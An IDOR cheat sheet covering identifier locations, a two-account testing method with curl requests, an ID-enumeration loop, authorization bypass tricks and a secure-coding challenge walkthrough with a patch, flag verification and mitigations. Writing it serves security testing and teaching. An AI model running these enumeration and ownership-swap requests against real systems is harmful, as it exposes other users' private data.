# 🔓 IDOR (Insecure Direct Object Reference) Cheat Sheet

> **Quick reference** for finding and validating broken object-level authorization.

> ⚠️ **Scope note:** Only test systems you own or have explicit written permission to assess. Use synthetic accounts; never access records belonging to real users.

---
### 🧭 **1. Quick Reference**

| Concept | Meaning |
|---------|---------|
| **Horizontal** | User A reads/writes User B's data at the same privilege level |
| **Vertical** | Low-privilege user reaches an admin object or endpoint |
| **Core test** | Swap the ID while keeping your own session; compare responses |
| **Key rule** | Authentication ≠ authorization: a session does not prove ownership |

---
### 🎯 **2. Where Identifiers Hide**

| Location | Example |
|----------|---------|
| Path | `GET /challenge/api/messages/<ID>` |
| Query / body | `?uid=<ID>`, `{"userId": <ID>}` |
| Headers / cookies | `X-User-Id: <ID>`, `profile=<ID>` |
| Files / frames | `?file=<ID>.pdf`, `{"event":"read","id":"<ID>"}` |

---
### 🧪 **3. Testing Method**

1. Create two accounts `<USER_A>`, `<USER_B>` with distinct objects.
2. Capture a request containing `<ID_A>` while logged in as `<USER_A>`.
3. Replace `<ID_A>` with `<ID_B>`; keep `<USER_A>`'s session token.
4. Compare status, body length, and fields for GET/PUT/PATCH/DELETE.

```bash
curl -i -b 'session=<TOKEN_A>' 'https://<TARGET>/challenge/api/messages/<ID_A>'
curl -i -b 'session=<TOKEN_A>' 'https://<TARGET>/challenge/api/messages/<ID_B>'
```

A `200` containing `<USER_B>`'s data confirms the flaw.

---
### 🔁 **4. Payload Patterns**

```http
GET /api/users/<ID> HTTP/1.1
Host: <TARGET>
Authorization: Bearer <TOKEN_A>
```

```json
{"userId": <ID_B>, "ownerId": <USER_A>}
```

```bash
for ID in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
    -b 'session=<TOKEN_A>' "https://<TARGET>/api/messages/$ID"
done
```

---
### 🧩 **5. Common Bypasses**

| Obstacle | Technique |
|----------|-----------|
| UUID IDs | Guess from logs, links, or other endpoints |
| Encoded ID | Decode base64/hex, then re-encode a known `<ID>` |
| Self-check | Pollute `ownerId` / `accountId` parameters |
| Blocked ID | `?id=<ID_B>&id=<ID_A>` (parameter pollution) |
| Version gap | Repeat on `/v1/`, `/v2/`, `/internal/` |
| Referer check | `Referer: https://<TARGET>/account/<USER_A>` |

```bash
curl -X PATCH -b 'session=<TOKEN_A>' -H 'Content-Type: application/json' \
  -d '{"owner":"<USER_A>","userId":<ID_B>}' 'https://<TARGET>/api/profile/<ID_B>'
```

---
### 📦 **6. Case Study: Commnet Secure-Coding Challenge**

**Endpoint:** `GET /challenge/api/messages/:id`. In `routes/messages.js` the message is queried by `id` with no ownership check.

```js
// 🔴 Vulnerable: query by id only
const message = await db.getMessageById(req.params.id);
return res.json(message);
```

**Patch applied in the editor:**

```js
const userId = req.session.userId;
// ... after loading the message ...
if (message.sender_id !== userId &&
    message.recipient_id !== userId &&
    message.recipient_id !== null) return 403;
return res.json(message);
```

The sender or recipient may read. The `message.recipient_id !== null` exception preserves **broadcast messages** (null recipient) for all users.

**Saving via Socket.IO event `message`:**

```js
socket.emit('message', {
  type: 'save',
  data: {
    fileName: 'routes/messages.js',
    content: '<PATCHED_FILE_CONTENT>',
    md5: '<MD5_OF_CURRENT_SERVER_FILE>'
  }
});
```

> ⚠️ `md5` is the checksum of the **current server file**, not the edited `content`; otherwise the save fails with `save_conflict`.

**Verification**

1. Send the save with the current file's `md5`; confirm success.
2. Restart the service so the patch loads.
3. Log in again and request `GET /challenge/api/messages/<ID>` with your session.
4. Expect `403` for a foreign private message and `200` for a broadcast message.
5. Obtain the real success response containing `<FLAG>` — **never store the flag value**.
6. ⚠️ The sample message contains a **decoy fake flag**; the post-restart verification output is authoritative.

---
### 💥 **7. Impact**

- Private messages, invoices, and PII disclosed.
- Unauthorized edits or deletes of another user's records.
- Privilege escalation via admin objects (vertical IDOR).
- Account takeover through reset / email-change object references.

---
### 🛡️ **8. Mitigation**

- Enforce object-level authorization on every request: compare owner to session subject.
- Centralize checks in middleware and deny by default.
- Treat unpredictable IDs as defense in depth only.
- Apply the same checks to read, write, delete, export, and WebSocket handlers.
- Add cross-user regression tests; log repeated out-of-owner access.

---
### ✅ **9. Checklist**

- [ ] Mapped all identifier-bearing parameters and endpoints
- [ ] Tested horizontal and vertical access with two accounts
- [ ] Tested all methods, encoded IDs, and parameter pollution
- [ ] Verified broadcast/null-recipient semantics
- [ ] Saved with current-file `md5`, restarted, re-verified; ignored decoy flag

---
### 📚 **10. References**

- [OWASP IDOR Prevention](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference_Prevention)
- [OWASP API1: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)

---
**🔓 Happy (authorized) testing!**
